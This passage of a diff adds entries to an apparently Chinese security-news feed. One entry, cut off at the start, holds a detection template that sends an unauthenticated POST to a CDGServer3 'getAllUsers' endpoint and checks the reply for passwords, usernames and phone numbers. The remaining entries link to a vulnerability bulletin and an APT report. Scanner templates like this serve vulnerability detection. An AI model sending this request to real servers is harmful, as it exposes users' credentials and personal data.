class="hljs-operator">=</span>c267b9e9f51030ff79539087a735c4a95094cc4a94528a5e6521769d9e74903c9fc1a3d94d55&amp;token<span class="hljs-operator">=</span><span class="hljs-number">522460222</span>&amp;lang<span class="hljs-operator">=</span>zh_CN<span class="hljs-comment">#rd</span><br>  <span class="hljs-params">tags:</span> Information disclosure<br><br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> POST<br>      <span class="hljs-params">path:</span> <span class="hljs-symbol">/CDGServer3/openapi/getAllUsers</span><br>      <span class="hljs-params">body:</span> pageSize<span class="hljs-operator">=</span><span class="hljs-number">100</span>&amp;pageNumber<span class="hljs-operator">=</span><span class="hljs-number">1</span><br>    <span class="hljs-params">expression:</span> |<br>      response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> <br>      response.body.bcontains(b&#x27;password&#x27;) <span class="hljs-operator">&amp;&amp;</span> <br>      response.body.bcontains(b&#x27;username&#x27;) <span class="hljs-operator">&amp;&amp;</span><br>      response.body.bcontains(b&#x27;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">0</span>&#x27;) <span class="hljs-operator">&amp;&amp;</span><br>      response.body.bcontains(b&#x27;surname&#x27;) <span class="hljs-operator">&amp;&amp;</span><br>      response.body.bcontains(b&#x27;mobilephone&#x27;)<br><span class="hljs-params">expression:</span> r0()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;注: 本模块来自 AI 可能存在错误 &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+    <category term="zan8in/afrog:github commit" scheme="http://example.com/tags/zan8in-afrog-github-commit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CNVD漏洞周报2025年第21期</title>
+    <link href="http://example.com/2025/06/10/weixin_3853895616/"/>
+    <id>http://example.com/2025/06/10/weixin_3853895616/</id>
+    <published>2025-06-10T01:34:16.508Z</published>
+    <updated>2025-06-10T01:34:16.507Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 国家互联网应急中心CNCERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Vk6rAVlxcyUPjxOfVlVoJg">https://mp.weixin.qq.com/s/Vk6rAVlxcyUPjxOfVlVoJg</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 国家互联网应急中心CNCERT&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/Vk6rAVlxcyUPjxOfVlVoJg&quot;&gt;https://mp.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="国家互联网应急中心CNCERT" scheme="http://example.com/tags/%E5%9B%BD%E5%AE%B6%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E6%80%A5%E4%B8%AD%E5%BF%83CNCERT/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>卡巴斯基报告，APT组织针对独联体国家</title>
+    <link href="http://example.com/2025/06/10/weixin_773655140/"/>
+    <id>http://example.com/2025/06/10/weixin_773655140/</id>
+    <published>2025-06-10T01:32:39.596Z</published>
+    <updated>2025-06-10T01:32:39.593Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Ppc7V_QFL6EHCcWP1FKwNA">https://mp.weixin.qq.com/s/Ppc7V_QFL6EHCcWP1FKwNA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/Ppc7V_QFL6EHCcWP1FKwNA&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
     
   </entry>
   
